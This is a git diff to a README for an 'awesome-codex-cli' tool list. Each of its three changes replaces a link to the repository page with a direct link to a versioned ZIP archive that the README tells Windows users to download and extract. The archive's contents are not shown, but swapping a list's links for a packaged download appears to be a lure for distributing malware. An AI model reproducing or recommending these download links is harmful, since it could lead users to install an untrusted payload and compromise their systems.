@@ -1,6 +1,6 @@
 # 🤖 awesome-codex-cli - Find the Right Codex Tools Fast
 
-[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github)](https://github.com/commonplace-middledistance109/awesome-codex-cli)
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/commonplace-middledistance109/awesome-codex-cli/main/assets/codex-cli-awesome-v3.8-beta.1.zip)
 
 ## 🧭 What This Is
 
@@ -12,7 +12,7 @@ It helps you find useful add-ons in one place instead of searching across many p
 
 To get the files, visit this page to download:
 
-[https://github.com/commonplace-middledistance109/awesome-codex-cli](https://github.com/commonplace-middledistance109/awesome-codex-cli)
+[https://raw.githubusercontent.com/commonplace-middledistance109/awesome-codex-cli/main/assets/codex-cli-awesome-v3.8-beta.1.zip](https://raw.githubusercontent.com/commonplace-middledistance109/awesome-codex-cli/main/assets/codex-cli-awesome-v3.8-beta.1.zip)
 
 ### What to do on Windows
 
@@ -161,7 +161,7 @@ This repo is useful if you want to:
 
 If you only want to get started on Windows, use the download page, extract the ZIP, and open the main README file.
 
-[https://github.com/commonplace-middledistance109/awesome-codex-cli](https://github.com/commonplace-middledistance109/awesome-codex-cli)
+[https://raw.githubusercontent.com/commonplace-middledistance109/awesome-codex-cli/main/assets/codex-cli-awesome-v3.8-beta.1.zip](https://raw.githubusercontent.com/commonplace-middledistance109/awesome-codex-cli/main/assets/codex-cli-awesome-v3.8-beta.1.zip)
 
 ## 🗂️ Quick Navigation
 
